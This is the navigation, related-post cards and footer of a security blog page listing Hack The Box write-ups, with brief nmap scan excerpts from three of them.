href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/file-upload/">file-upload</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/ssrf/">ssrf</a> <a class="post-tag" href="/tags/ssti/">ssti</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/awscli/">awscli</a> <a class="post-tag" href="/tags/dns/">dns</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/writer/"><div class="card-body"> <em class="timeago small" data-ts="1639420200" > 2021-12-13 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Writer</h3><div class="text-muted small"><p> Enumeration IP-ADDR: 10.10.11.101 writer.htb nmap scan: 1 2 3 4 5 6 7 8 9 10 11 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; ...</p></div></div></a></div><div class="card"> <a href="/posts/cache/"><div class="card-body"> <em class="timeago small" data-ts="1600799400" > 2020-09-22 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Cache</h3><div class="text-muted small"><p> Scanning Nmap ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.188 | grep open | awk -F / &#39;{print $1}&#39; ORS=&#39;,&#39;) echo $ports &amp;amp;&amp;amp; nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10...</p></div></div></a></div><div class="card"> <a href="/posts/timing/"><div class="card-body"> <em class="timeago small" data-ts="1640197800" > 2021-12-22 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Timing</h3><div class="text-muted small"><p> Enumeration IP-ADDR: 10.10.11.135 timing.htb nmap scan: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/previse/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox - Previse</p></a> <a href="/posts/proper/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox - Proper</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/p00rduck">p00rduck</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/command-injection/">command injection</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/file-upload/">file-upload</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/ssrf/">ssrf</a> <a class="post-tag" href="/tags/ssti/">ssti</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/awscli/">awscli</a> <a class="post-tag" href="/tags/dns/">dns</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
